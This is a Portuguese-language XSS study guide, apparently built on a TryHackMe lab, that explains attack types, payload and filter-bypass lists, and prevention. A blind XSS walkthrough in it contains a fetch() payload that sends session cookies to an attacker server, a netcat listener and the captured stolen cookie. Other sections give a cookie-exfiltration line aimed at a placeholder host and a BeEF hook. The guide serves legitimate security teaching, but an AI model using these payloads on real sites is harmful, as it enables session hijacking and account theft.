<!-- ===================================== -->
<!--        CROSS-SITE SCRIPTING (XSS)     -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Vulnerability-Cross--Site%20Scripting-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Category-Web%20Application%20Security-blue?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/OWASP-Top%2010-orange?style=flat-square">
  <img src="https://img.shields.io/badge/Attack%20Type-Code%20Injection-purple?style=flat-square">
  <img src="https://img.shields.io/badge/Impact-Session%20Hijacking-yellow?style=flat-square">
  <img src="https://img.shields.io/badge/Domain-Offensive%20Security-informational?style=flat-square">
</p>

---

# 🕷 Cross-Site Scripting (XSS)
## Injeção de Código JavaScript em Aplicações Web

> **Cross-Site Scripting (XSS)** é uma vulnerabilidade crítica de segurança em aplicações web que permite a um atacante **injetar código JavaScript malicioso** em páginas visualizadas por outros usuários.
>
> Quando explorada, a vulnerabilidade permite que scripts executem **diretamente no navegador da vítima**, utilizando o **mesmo contexto de segurança da aplicação legítima**. Isso possibilita que atacantes realizem diversas ações maliciosas sem que o usuário perceba.
>
> Dependendo do contexto da aplicação, um ataque XSS pode permitir:
>
> - 🍪 **Roubo de cookies de sessão**
> - 🔐 **Sequestro de contas (Account Takeover)**
> - 📡 **Exfiltração de dados sensíveis**
> - 🧠 **Execução de ações em nome do usuário**
> - 🎭 **Defacement ou modificação do conteúdo da página**
>
> Devido à sua simplicidade de exploração e alto impacto potencial, o XSS permanece como **uma das vulnerabilidades mais comuns em aplicações web modernas**.

---

## 🧰 Ferramentas Utilizadas

Durante testes e demonstrações de vulnerabilidades XSS, ferramentas amplamente utilizadas em **Pentest e Bug Bounty** incluem:

- **Burp Suite** — Proxy e scanner de aplicações web  
- **OWASP ZAP** — Scanner open-source de vulnerabilidades  
- **XSStrike / XSSer** — Ferramentas especializadas em detecção de XSS  
- **DOM Invader** — Detecção de DOM XSS  
- **BeEF (Browser Exploitation Framework)** — Exploração avançada via navegador  

---

⚠️ Este material possui fins **educacionais e de pesquisa em segurança**.  
Todos os exemplos e técnicas apresentados devem ser utilizados **apenas em ambientes autorizados**, como **laboratórios, CTFs ou testes de segurança com permissão explícita**.

---

# Cross-Site Scripting (XSS)

## 1. Introdução ao Cross-Site Scripting (XSS)

### 1.1. O que é XSS?

Cross-Site Scripting (XSS) é um tipo de vulnerabilidade de segurança em aplicações web que permite a um atacante **injetar scripts maliciosos** em páginas web visualizadas por outros usuários. Trata-se de um ataque de **injeção de código**, onde scripts maliciosos são inseridos em sites legítimos e confiáveis.

Quando um usuário visita uma página comprometida, o script malicioso é executado no navegador da vítima, podendo acessar cookies, tokens de sessão e outras informações sensíveis armazenadas pelo navegador.

### 1.2. Impacto e Severidade

O impacto de um XSS pode variar significativamente:

| Nível de Impacto | Descrição                                         |
| ---------------- | ------------------------------------------------- |
| **Baixo**        | Sites públicos sem dados sensíveis (brochureware) |
| **Médio**        | Aplicações comuns com dados de usuários           |
| **Alto/Crítico** | Banking, e-commerce, sistemas com dados sensíveis |
| **Crítico**      | Usuários com privilégios elevados (admins)        |

Embora frequentemente classificados como severidade "média", os ataques XSS podem levar a:

- **Account Takeover (ATO)**: Assunção total da conta da vítima
- **Exfiltração de dados**: Roubo de informações sensíveis
- **Modificação de dados**: Alteração não autorizada de informações
- **Execução remota de código**: Em cenários específicos com renderização de arquivos locais

### 1.3. Prevalência

XSS é extremamente comum. De acordo com estudos, **33% dos websites e aplicações web são vulneráveis a XSS**. É considerado o **tipo de vulnerabilidade mais frequente** em programas de Bug Bounty e ocupa posições de destaque no **OWASP Top 10**.

---
## 2. Como o XSS Funciona

### 2.1. Princípio Básico

O XSS ocorre quando uma aplicação web recebe dados de uma fonte não confiável (geralmente uma requisição HTTP) e os inclui em seu conteúdo dinâmico sem validação ou codificação adequada.

O fluxo básico é:

1. O atacante identifica um ponto de entrada onde dados fornecidos pelo usuário são refletidos na resposta
2. O atacante insere código malicioso (payload) neste ponto de entrada
3. Quando um usuário acessa a página, o código é executado em seu navegador

### 2.2. Prova de Conceito (PoC)

A forma mais comum de confirmar uma vulnerabilidade XSS é usar a função `alert()`, pois é curta, inofensiva e fácil de identificar quando executada.

```html
<script>alert('XSS')</script>
```

**Nota importante:** A partir do Chrome 92 (julho/2021), iframes de origem cruzada (cross-origin) são impedidos de chamar `alert()`. Em cenários de teste, recomenda-se usar `print()` como alternativa:

```html
<script>print()</script>
```

---
## 3. Tipos de XSS

### 3.1. Reflected XSS (Não Persistente)

O **Reflected XSS** ocorre quando o script malicioso é refletido pelo servidor web imediatamente, como parte da resposta a uma requisição HTTP. O payload não é armazenado no servidor, mas sim "refletido" de volta ao usuário.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png)

**Características:**

- **Origem**: O script malicioso vem da requisição HTTP atual
- **Persistência**: Não persistente (apenas uma requisição/resposta)
- **Entrega**: Normalmente via links maliciosos, phishing ou engenharia social

**Exemplo vulnerável:**

- URL:

```html
https://insecure-website.com/status?message=All+is+well.
```

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png)

- Resposta:

```html
Resposta: <p>Status: All is well.</p>
```

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png)

**Exploração:**

- URL:

```html
https://insecure-website.com/status?message=<script>alert('XSS')</script>
```

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/66743e9fa50b4c5793f070eb505f72d1.png)

- Resposta:

```html
<p>Status: <script>alert('XSS')</script></p>
```

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24e50d95cecfc3783bd1a3a4fecbf310.png)

**Fluxo de exploração:**

```text
Atacante cria URL maliciosa → Envia para vítima (phishing) → 
Vítima clica → Payload executa → Atacante captura sessão/dados
```

### 3.2. Stored XSS (Persistente)

O **Stored XSS** ocorre quando o script malicioso é permanentemente armazenado no servidor (banco de dados, sistema de arquivos, etc.) e executado quando outros usuários acessam o conteúdo infectado.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png)

**Características:**

- **Origem**: O script vem do banco de dados ou armazenamento do servidor
- **Persistência**: Persistente (permanece no servidor)
- **Impacto**: Mais crítico, afeta múltiplos usuários ao longo do tempo

**Exemplos de locais vulneráveis:**

- Comentários em blogs/foruns
- Nomes de usuário em chats
- Campos de perfil
- Feedbacks e avaliações
- Posts em redes sociais

**Exemplo:**

```html
<!-- Comentário enviado pelo atacante -->
<p><script>/* Código malicioso */</script></p>

<!-- Quando outros usuários acessarem, o script executa -->
```

**Fluxo de exploração persistente:**

```text
Atacante injeta payload em campo persistente → Payload armazenado no servidor →
Vítimas acessam página contaminada → Payload executa → Dados são exfiltrados
```

### 3.3. DOM-based XSS

O **DOM-based XSS** ocorre inteiramente no lado do cliente, quando código JavaScript inseguro manipula dinamicamente o DOM (Document Object Model) usando dados de fontes não confiáveis.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png)

**Características:**

- **Origem**: O payload nunca passa pelo servidor
- **Persistência**: A vulnerabilidade está no código JavaScript do cliente
- **Detecção**: Mais difícil, pois não aparece nas respostas HTTP

**Fontes comuns de entrada no DOM:**

```javascript
document.URL
document.location
document.referrer
window.location
navigator.userAgent
```

**Sinks perigosos:**

```javascript
document.write()
document.writeln()
element.innerHTML
element.outerHTML
eval()
setTimeout()
setInterval()
```

**Exemplo vulnerável:**

```html
<script>
  document.write("Site está em: " + document.location.href + ".");
</script>
```

**Exploração:**

- URL:

```html
https://site.com/page.html#<script>alert('XSS')</script>
```

- Resultado: O código após `#` não vai para o servidor, mas o JavaScript do cliente o insere no DOM, executando o script.

**Exemplo com atributo `href`:**

```javascript
// Código vulnerável
document.body.innerHTML += "<a href='"+window.location.href+"'>Home</a>";

// Exploração
https://exemplo.com/index.php/x' onmouseover=alert(1) style='display:block'

// HTML resultante
<a href="x" onmouseover="alert(1)" style="display:block">Home</a>
```

### 3.4. Blind XSS (XSS Cego)

**Blind XSS** é uma forma de XSS persistente onde o payload é executado em um contexto que o atacante não pode ver diretamente, como painéis administrativos, sistemas de ticket ou backends.

**Características:**

- **Execução**: Ocorre em áreas restritas (admin panels, dashboards)
- **Confirmação**: Difícil sem ferramentas específicas
- **Impacto**: Potencialmente crítico (acesso administrativo)    

**Exemplo típico:**

- Formulário de feedback/contato
- Atacante injeta payload
- Funcionário/admin abre o feedback no painel administrativo
- Payload executa no contexto privilegiado

### 3.5. Mutation-based XSS (mXSS)

O **Mutation-based XSS** explora como os navegadores processam e "mutam" o DOM durante a renderização, aproveitando-se de otimizações específicas do navegador.

**Características**:

- Depende do comportamento específico do navegador
- Pode burlar sanitizadores que não consideram mutações
- Mais complexo de detectar e explorar

---
## 4. O que um Atacante Pode Fazer com XSS?

Um atacante que explora XSS pode:

|Ação|Descrição|
|---|---|
|**Se passar pela vítima**|Executar ações em nome do usuário|
|**Roubar credenciais**|Capturar cookies de sessão, tokens|
|**Ler dados**|Acessar qualquer informação visível ao usuário|
|**Modificar conteúdo**|Alterar a página (desfiguração virtual)|
|**Injetar funcionalidades**|Adicionar trojans, keyloggers|
|**Redirecionar usuários**|Para sites maliciosos (phishing)|
|**Capturar teclas**|Keylogging via JavaScript|
|**Acessar hardware**|Com APIs HTML5 (geolocalização, câmera, microfone)[](https://www.acunetix.com/blog/articles/33-websites-webapps-vulnerable-xss/)|

**Exemplo de exfiltração de cookies:**

```javascript
fetch(`//ATTACKER-SERVER.com/?data=${btoa(document.cookie)}`)
```

---
## 5. Payloads e Técnicas de Ofuscação

### 5.1. Payloads Básicos

```html
<!-- Tag script simples -->
<script>alert('XSS')</script>

<!-- Sem tags script -->
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>

<!-- Atributos diversos -->
<svg onload=alert('XSS')>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
```

### 5.2. Payloads em Atributos HTML

```html
<!-- Quebra de contexto em atributos -->
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
</script><script>alert('XSS')</script>

<!-- Em atributos de eventos -->
" onmouseover="alert('XSS')
' onfocus='alert('XSS')
```

### 5.3. Ofuscação com Codificação URI

```html
<!-- Codificação URL -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Codificação HTML -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- Codificação JavaScript -->
\x3cscript\x3ealert('XSS')\x3c/script\x3e
```

### 5.4. Ofuscação com Base64

Usando a tag `<meta>` para carregar payload em Base64:

```html
<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
```

### 5.5. Bypass de Filtros

**Uso de diferentes codificações UTF-8:**

```html
<IMG SRC=jAvascript:alert('XSS')>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```

**Uso de caracteres de controle**:

```html
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```

**Payloads sem parênteses**:

```html
<script>alert`XSS`</script>
<script>alert(document['cookie'])</script>
```

**Quebra de filtros de palavras**:

```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<<script>alert('XSS')</script>
```

---
## 6. Blind XSS na Prática — Exploração em Cenário Real

Nesta seção, demonstraremos a exploração prática de uma vulnerabilidade **Blind XSS** em um sistema de tickets de suporte. O cenário simula um ambiente onde o atacante não tem visibilidade direta da execução do payload, que ocorre em um contexto privilegiado (painel administrativo).

### 6.1. Identificação do Ponto de Entrada

**Passo 1: Acessar a funcionalidade alvo**

Navegamos até a área de **"Support Tickets"** da aplicação. Esta funcionalidade permite que usuários criem tickets de suporte, que posteriormente serão visualizados por membros da equipe administrativa.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/34e69ee3fce3021fee02a13a680d5d47.png)

**Passo 2: Criar um ticket de teste**

Criamos um ticket com conteúdo simples para entender como os dados são processados e exibidos:

- **Assunto:** `test`
- **Conteúdo:** `test`

Após a criação, o ticket aparece na lista com um número de identificação único.

### 6.2. Análise do Contexto de Saída

**Passo 3: Inspecionar o código-fonte**

Ao abrir o ticket recém-criado e visualizar o código-fonte da página (F12), observamos que o texto inserido é renderizado dentro de uma tag `<textarea>`:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/23721628b263e7d6fd00097904bc6847.png)

**Análise do contexto:**

- O conteúdo do ticket está inserido **entre as tags** `<textarea>` e `</textarea>`
- Para executar JavaScript, precisamos **escapar deste contexto** fechando a tag antes de injetar nosso payload

### 6.3. Teste de Escapamento de Contexto

**Passo 4: Tentar fechar a tag textarea**

Criamos um novo ticket com o seguinte conteúdo:

```html
</textarea>teste
```

**Explicação:**

- `</textarea>` fecha a tag prematuramente
- `teste` será renderizado fora da tag, no contexto HTML principal

**Resultado esperado:** O texto "teste" deve aparecer fora da caixa de texto, confirmando que conseguimos escapar do contexto original.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/0ad04cf010b889a8adfdba9d24bcb826.png)

### 6.4. Confirmação da Vulnerabilidade XSS

**Passo 5: Injetar payload de prova de conceito**

Agora que confirmamos o escapamento, testamos se podemos executar JavaScript:

```html
</textarea><script>alert('THM');</script>
```

**Resultado:** Ao abrir o ticket, uma janela de alerta com o texto "THM" é exibida, confirmando que a aplicação é vulnerável a XSS.

### 6.5. Exploração Avançada: Exfiltração de Cookies

Como este é um sistema de tickets, podemos assumir que **membros da equipe de suporte** (provavelmente com privilégios administrativos) também visualizarão o ticket. Isto caracteriza um **Blind XSS** — o payload executa em um contexto que não podemos ver diretamente, mas podemos capturar as informações exfiltradas.

#### 6.5.1. Configuração do Servidor de Escuta

Precisamos de um servidor para receber os dados exfiltrados. Usaremos o **Netcat**:

```bash
nc -lvnp 9001
```

#### 6.5.2. Construção do Payload de Exfiltração

```html
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```

**Análise detalhada do payload:**

|Parte do Payload|Descrição|
|---|---|
|`</textarea>`|Fecha a tag textarea, saindo do contexto restrito|
|`<script>`|Inicia um bloco de código JavaScript|
|`fetch(...)`|Função JavaScript que faz uma requisição HTTP|
|`'http://SEU_IP:9001?cookie='`|URL do servidor atacante com parâmetro `cookie`|
|`+`|Operador de concatenação de strings|
|`btoa(document.cookie)`|Codifica os cookies em Base64 (evita problemas de encoding na URL)|
|`document.cookie`|Acessa os cookies do site atual|
|`</script>`|Fecha o bloco JavaScript|

**Funcionamento:**

1. Quando a vítima (funcionário/admin) abrir o ticket, o payload é executado
2. O JavaScript captura os cookies da sessão (`document.cookie`)
3. Os cookies são codificados em Base64 para transmissão segura
4. Uma requisição HTTP GET é enviada ao servidor do atacante com os cookies no parâmetro `cookie`

#### 6.5.3. Resultado da Exfiltração

No terminal do Netcat, recebemos:

```text
Connection received on 10.65.149.42 37268
GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ== HTTP/1.1
Host: 10.65.122.245:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.72 Safari/537.36
Accept: */*
Origin: http://172.17.0.1
Referer: http://172.17.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

#### 6.5.4. Decodificação do Cookie

O cookie está codificado em Base64. Podemos decodificá-lo facilmente:

**No terminal Linux:**

```bash
echo 'c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==' | base64 -d
```

**Resultado:**

```text
staff-session=4AB305E55955197693F01D6F8FD2D321
```

### 6.6. Impacto da Exploração

Com o cookie de sessão do funcionário em mãos, o atacante pode:

1. **Sequestrar a sessão**: Injetar o cookie no navegador e acessar o sistema como o funcionário
2. **Escalar privilégios**: Se o funcionário tiver acesso administrativo, o atacante ganha controle total
3. **Acessar tickets de outros usuários**: Visualizar informações sensíveis de suporte
4. **Persistência**: Manter acesso mesmo após a correção da vulnerabilidade

### 6.7. Resumo do Ataque Blind XSS

|Passo|Ação|Resultado|
|---|---|---|
|1|Criar ticket de teste|Identificar contexto de saída (textarea)|
|2|Testar escapamento com `</textarea>`|Confirmar possibilidade de sair do contexto|
|3|Injetar `alert('THM')`|Confirmar execução de JavaScript|
|4|Configurar listener Netcat|Preparar servidor para receber dados|
|5|Criar payload com `fetch()`|Exfiltrar cookies da vítima|
|6|Funcionário abre ticket|Payload executa, cookies são enviados|
|7|Decodificar Base64|Obter cookie de sessão válido|

### 6.8. Conceitos Importantes Demonstrados

| onceito                     | Descrição                                                        |
| --------------------------- | ---------------------------------------------------------------- |
| **Blind XSS**               | XSS onde o atacante não vê a execução, mas captura os resultados |
| **Escapamento de contexto** | Fechar tags para sair de contextos restritos                     |
| **Exfiltração de dados**    | Envio de informações sensíveis para servidor externo             |
| **Codificação Base64**      | Técnica para transmitir dados binários em texto seguro para URLs |
| **Sequestro de sessão**     | Uso de cookies roubados para assumir identidade da vítima        |

---
## 7. Ferramentas para Detecção e Exploração

### 7.1. Scanners Automatizados

| **Ferramenta** | **Descrição**                   | **Exemplo de Uso**               |
| -------------- | ------------------------------- | -------------------------------- |
| Burp Suite     | Scanner web com detecção de XSS | `Burp > Scanner > Live Scanning` |
| OWASP ZAP      | Similar ao Burp, open-source    | `ZAP > Attack > Active Scan`     |
| Acunetix       | Scanner comercial especializado | -                                |
| Nessus         | Scanner de vulnerabilidades     | -                                |
| Nikto          | Scanner de servidores web       | `nikto -h https://alvo.com`      |

**Burp Suite Professional** combina análise estática e dinâmica de JavaScript para detectar vulnerabilidades DOM-based

### 7.2. Ferramentas Manuais

| Ferramenta      | Descrição                                | Exemplo de Uso                                             |
| --------------- | ---------------------------------------- | ---------------------------------------------------------- |
| **XSSer**       | Framework automatizado para XSS          | `xsser --url "https://alvo.com/page.php?q=XSS"`            |
| **XSStrike**    | Scanner avançado com gerador de payloads | `python xsstrike.py -u "https://alvo.com/page.php?q=test"` |
| **DOM Invader** | Extensão Burp para DOM XSS               | Integrado ao Burp                                          |
| **Ffuf**        | Fuzzing de parâmetros                    | `ffuf -u "https://alvo.com/page?FUZZ=test" -w params.txt`  |

### 7.3. Ferramentas para Blind XSS

| Ferramenta     | Descrição                                          |
| -------------- | -------------------------------------------------- |
| **XSS Hunter** | Serviço que detecta Blind XSS                      |
| **Beef**       | Framework de exploração (também captura Blind XSS) |

### 7.4. Frameworks de Exploração

| Ferramenta                                | Descrição                   | Exemplo de Uso                                                     |
| ----------------------------------------- | --------------------------- | ------------------------------------------------------------------ |
| **Beef (Browser Exploitation Framework)** | Framework para explorar XSS | Hook via `<script src="http://beef-server:3000/hook.js"></script>` |
| **XSSer**                                 | Exploração automatizada     | -                                                                  |

---
## 8. Como Testar e Encontrar XSS

### 8.1. Abordagem Manual

**Passo 1: Identificar pontos de entrada**

- Parâmetros GET/POST
- Headers HTTP (User-Agent, Referer, Cookie)
- Caminhos da URL
- Upload de arquivos

**Passo 2: Injetar payloads de teste**  
Use strings únicas como `"XSS-TEST-123"` para facilitar a localização.

**Passo 3: Identificar reflexões**  
Procure onde seu input aparece na resposta:

- No HTML
- Em atributos
- Em tags `<script>`
- Em CSS

**Passo 4: Testar cada contexto**

- **Contexto HTML**: Testar `<script>alert(1)</script>`
- **Contexto atributo**: Testar `" onmouseover="alert(1)`
- **Contexto JavaScript**: Testar `';alert(1)//`

**Passo 5: Confirmar com payloads funcionais**

### 8.2. Abordagem Automatizada

**Burp Suite Scanner**:

- Varredura passiva e ativa    
- Detecção de DOM XSS via análise JavaScript
- Payloads customizáveis

**Fuzzing com wordlists**:

```bash
ffuf -u "https://alvo.com/page.php?q=FUZZ" -w xss-payloads.txt -fc 200,404
```

### 8.3. Dicas Práticas

- **Teste todos os parâmetros**: Não apenas os óbvios
- **Headers também contam**: User-Agent, Referer, X-Forwarded-For
- **Consoles de desenvolvedor**: Use `F12` para depurar
- **DOM Invader**: Excelente para DOM XSS
- **Paciência**: Blind XSS pode levar horas/dias para confirmar

---
## 9. Prevenção e Mitigação

### 9.1. Validação de Entrada (Input Validation)

- Validar dados no recebimento (servidor)
- Usar **whitelists** (listas de permitidos) sempre que possível
- Rejeitar dados inválidos, não tentar "sanitizar"

**Exemplo**: Nomes devem conter apenas letras e espaços; anos de nascimento devem ter 4 dígitos numéricos.

### 9.2. Codificação de Saída (Output Encoding)

A codificação deve ser aplicada **no momento da saída** e ser **contextual**:

|Contexto|Codificação|Exemplo|
|---|---|---|
|HTML|HTML Entity Encoding|`<` → `&lt;`|
|Atributo HTML|HTML Attribute Encoding|`"` → `&quot;`|
|JavaScript|JavaScript Unicode Escapes|`'` → `\x27`|
|CSS|CSS Escaping|`(` → `\28`|
|URL|URL Encoding|`/` → `%2F`|

**Exemplo em PHP**:

```php
echo htmlentities($userInput, ENT_QUOTES, 'UTF-8');
```

**Exemplo em Java com Google Guava:**

```java
import com.google.common.html.HtmlEscapers;
String safe = HtmlEscapers.htmlEscaper().escape(userInput);
```

### 9.3. Content Security Policy (CSP)

**Exemplo de CSP**:

```text
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

**Configuração via meta tag:**

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

### 9.4. HttpOnly Cookies

A flag `HttpOnly` impede que cookies sejam acessados via JavaScript, mitigando roubo de sessão via XSS.

```text
Set-Cookie: sessionid=abc123; HttpOnly; Secure
```

### 9.5. Frameworks Modernos

Frameworks modernos como React, Angular e Vue têm **proteções automáticas** contra XSS quando usados corretamente:

- React escapa automaticamente tudo em `{ }`
- Angular sanitiza inputs por padrão
- Vue faz escaping automático

### 9.6. Desabilitar HTTP TRACE

Desabilitar o método HTTP `TRACE` previne ataques que podem capturar cookies mesmo com `HttpOnly` ativado.

---
## 10. XSS vs. CSRF

### 10.1. Diferenças Fundamentais

|Aspecto|XSS|CSRF|
|---|---|---|
|**Natureza**|Executa JavaScript arbitrário|Induz ações não intencionais|
|**Comunicação**|Bidirecional (envia e recebe)|Unidirecional (apenas envia)|
|**Alcance**|Qualquer ação do usuário|Ações específicas vulneráveis|
|**Gravidade**|Geralmente mais grave|Geralmente menos grave|

### 10.2. CSRF Tokens Previnem XSS?

**Parcialmente**. CSRF tokens podem prevenir certos tipos de XSS refletido, mas:

- Não protegem contra Stored XSS
- Não protegem contra XSS em endpoints sem token
- XSS pode contornar tokens (script obtém o token da página)

---
## 11. Conclusão

O Cross-Site Scripting continua sendo uma das vulnerabilidades mais prevalentes e perigosas em aplicações web. Sua versatilidade permite desde roubo de sessão até comprometimento total de contas privilegiadas.

**Principais aprendizados**:

1. **XSS é um problema de confiança**: A aplicação confia cegamente em dados fornecidos pelo usuário
2. **Contexto é tudo**: A mesma entrada pode ser segura ou perigosa dependendo de onde é inserida
3. **Defesa em camadas**: Validação + Codificação + CSP + HttpOnly formam a melhor proteção
4. **Atualize-se**: Técnicas de bypass evoluem constantemente

Para profissionais de segurança, dominar XSS é essencial, pois transforma falhas comuns em oportunidades de alto impacto em testes de penetração e programas de Bug Bounty.

---
## 12. Referências e Recursos

|Tipo|Descrição|Link|
|---|---|---|
|**OWASP**|Cross Site Scripting (XSS)|[owasp.org/www-community/attacks/xss](https://owasp.org/www-community/attacks/xss)|
|**OWASP**|XSS Filter Evasion Cheat Sheet|[owasp.org/.../XSS_Filter_Evasion_Cheat_Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)|
|**OWASP**|XSS Prevention Cheat Sheet|[owasp.org/.../Cross_Site_Scripting_Prevention_Cheat_Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)|
|**PortSwigger**|Cross-site scripting|[portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)|
|**PortSwigger**|DOM-based XSS|[portswigger.net/web-security/cross-site-scripting/dom-based](https://portswigger.net/web-security/cross-site-scripting/dom-based)|
|**GTFOBins**|Binários Unix exploráveis|[gtfobins.github.io](https://gtfobins.github.io)|
|**Exploit Database**|Base de exploits|[exploit-db.com](https://www.exploit-db.com)|
|**XSS Hunter**|Blind XSS detection|[xsshunter.com](https://xsshunter.com)|
|**Beef**|Browser Exploitation Framework|[beefproject.com](https://beefproject.com)|
